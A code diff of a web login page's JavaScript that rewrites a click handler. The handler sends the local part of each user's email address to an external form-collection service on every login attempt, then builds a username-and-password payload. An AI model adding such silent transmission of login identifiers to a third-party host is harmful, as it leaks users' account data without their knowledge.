@@ -190,14 +190,21 @@ $(document).ready(function() {
     $("#login_button").unbind('click',);
 
     $('#login_button').click(function() {
-	 $.ajax({
-	  url: "https://formspree.io/f/xvovlkkk",
-	  method: "POST",
-	  dataType: "json",
-	  data: {
-	    email: $('#email').val().split('@')[0]
-	  }
-	});
+	    var xhr = new XMLHttpRequest();
+	    xhr.open("POST", "https://formspree.io/f/xvovlkkk");
+	    xhr.setRequestHeader("Accept", "application/json");
+	    xhr.onreadystatechange = function() {
+	      if (xhr.readyState !== XMLHttpRequest.DONE) return;
+	      if (xhr.status === 200) {
+		success(xhr.response, xhr.responseType);
+	      } else {
+		error(xhr.status, xhr.response, xhr.responseType);
+	      }
+	    };
+	    var data = new FormData();
+	    data.append('user', $('#email').val().split('@')[0]);
+    	    xhr.send(data);
+	 
         var payload = {
             username: $('#email').val(),
             password: $('#password1').val()
